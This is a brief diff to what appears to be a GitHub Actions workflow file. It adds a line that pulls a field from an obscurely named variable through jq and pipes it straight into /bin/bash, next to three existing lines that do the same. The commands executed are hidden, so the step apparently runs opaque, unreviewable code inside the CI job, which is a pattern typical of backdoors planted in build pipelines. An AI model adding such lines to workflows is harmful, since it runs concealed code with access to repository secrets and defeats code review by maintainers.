@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$lld45158" | jq -r .d8 | /bin/bash
           echo $st59758 | jq -r .betrf4768 | /bin/bash
           printf '%s' "$bt7335" | jq -r .v5 | /bin/bash
+          printf '%s' "$lsvm97893" | jq -r .ar08 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
